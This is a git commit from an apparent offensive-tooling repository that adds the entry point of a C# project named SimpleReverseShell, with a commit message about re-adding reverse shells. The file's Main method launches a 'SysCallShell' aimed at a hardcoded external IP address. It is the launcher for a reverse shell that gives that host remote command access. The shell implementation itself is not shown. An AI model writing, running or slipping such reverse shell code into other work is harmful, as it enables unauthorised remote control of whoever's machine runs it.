c2b1343513dcfb001c856c5ca7601f8dcbe432a5
Antheius-AT <53980774+Antheius-AT@users.noreply.github.com>
2024-09-23 15:39:30 +0200

    Re-added missing csproj files. Re added basic and syscall reverse shells

---
+++ SimpleReverseShell/Program.cs
@@ -0,0 +1,19 @@
+﻿using System.Text;
+using System.Diagnostics;
+using System.Net.Sockets;
+using System.IO;
+
+namespace SimpleReverseShell
+{
+  public class Program
+  {
+    public static void Main(string[] args)
+    {
+      //var simpleDotNetShell = new SimpleDotNetShell();
+      //simpleDotNetShell.Start();
+
+      var simplesyscallshell = new SysCallShell("172.104.237.62");
+      simplesyscallshell.Main(Array.Empty<string>());
+    }
+  }
+}
